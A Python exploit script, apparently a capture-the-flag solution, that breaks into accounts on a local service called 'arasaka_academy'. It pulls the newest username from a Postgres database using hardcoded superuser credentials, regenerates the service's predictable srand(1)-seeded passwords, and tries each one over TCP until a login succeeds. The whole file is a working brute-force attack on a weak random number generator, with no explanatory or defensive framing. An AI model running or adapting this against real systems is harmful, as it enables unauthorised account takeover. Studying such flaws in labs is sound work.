#!/usr/bin/env python3
"""Brute-force the latest account using deterministic rand() passwords.

Steps:
 1) Reads only the last username from the given Postgres table.
 2) Generates passwords exactly like the binary: 32 chars of (rand()%25)+65 with srand(1).
    Tries passwords sequentially until login succeeds or attempts are exhausted.
"""

import socket
import ctypes
import ctypes.util
from dataclasses import dataclass

import psycopg

# --- CONFIG ---
DB_HOST = "127.0.0.1"
DB_PORT = 5432
DB_USER = "postgres"
DB_PASS = "cowwithballs"
DB_NAME = "arasaka_academy"
DB_TABLE = "students"  # "students" or "professors"

SERVICE_HOST = "127.0.0.1"  # where the binary is exposed
SERVICE_PORT = 1337  # service TCP port
CONNECT_TIMEOUT = 5
MAX_ATTEMPTS = 2000  # set higher if нужно «до посинения»
# ---------------


libc = ctypes.CDLL(ctypes.util.find_library("c"))


def reset_rand(seed: int = 1) -> None:
    libc.srand(seed)


def next_password() -> str:
    """Return the next 32-char password using rand()%25+65."""
    return "".join(chr((libc.rand() % 25) + 65) for _ in range(32))


@dataclass
class Account:
    idx: int
    name: str
    password: str


def fetch_last_account() -> Account:
    conn = psycopg.connect(
        host=DB_HOST,
        port=DB_PORT,
        user=DB_USER,
        password=DB_PASS,
        dbname=DB_NAME,
    )
    cur = conn.cursor()
    cur.execute(f"SELECT id, name FROM {DB_TABLE} ORDER BY id DESC LIMIT 1;")
    last = cur.fetchone()
    cur.execute(f"SELECT COUNT(*) FROM {DB_TABLE};")
    total_row = cur.fetchone()
    total = total_row[0] if total_row else 0
    cur.close()
    conn.close()

    reset_rand(1)
    return Account(idx=total - 1, name=last[1] if last else "", password="")


def recv_until(
    sock: socket.socket, marker: bytes, timeout: float = CONNECT_TIMEOUT
) -> bytes:
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def try_login(acc: Account, as_prof: bool) -> tuple[bool, bytes]:
    s = socket.create_connection((SERVICE_HOST, SERVICE_PORT), timeout=CONNECT_TIMEOUT)
    recv_until(s, b"Choose:")
    s.sendall(b"1\n")  # Login
    recv_until(s, b"Login as:")
    s.sendall(b"2\n" if as_prof else b"1\n")
    recv_until(s, b"Enter username:")
    s.sendall((acc.name + "\n").encode())
    recv_until(s, b"Enter password:")
    s.sendall((acc.password + "\n").encode())
    banner = recv_until(s, b"Choose:", timeout=3)
    s.close()
    ok = b"Student" in banner or b"Professor" in banner or b"Get info" in banner
    return ok, banner


def main() -> None:
    account = fetch_last_account()
    if not account.name:
        print("[!] No accounts found")
        return
    print(f"[+] Bruting last account idx={account.idx} name={account.name} from {DB_TABLE}")
    as_prof = DB_TABLE == "professors"
    # reset rand and brute sequentially
    reset_rand(1)
    for attempt in range(1, MAX_ATTEMPTS + 1):
        pwd = next_password()
        acc = Account(idx=account.idx, name=account.name, password=pwd)
        ok, banner = try_login(acc, as_prof)
        status = "OK" if ok else "FAIL"
        print(f"[{status}] attempt={attempt} {acc.name} / {acc.password}")
        if ok:
            for line in banner.decode(errors="ignore").splitlines()[:5]:
                print("  ", line)
            break
    else:
        print(f"[!] Reached MAX_ATTEMPTS={MAX_ATTEMPTS} without success")


if __name__ == "__main__":
    main()
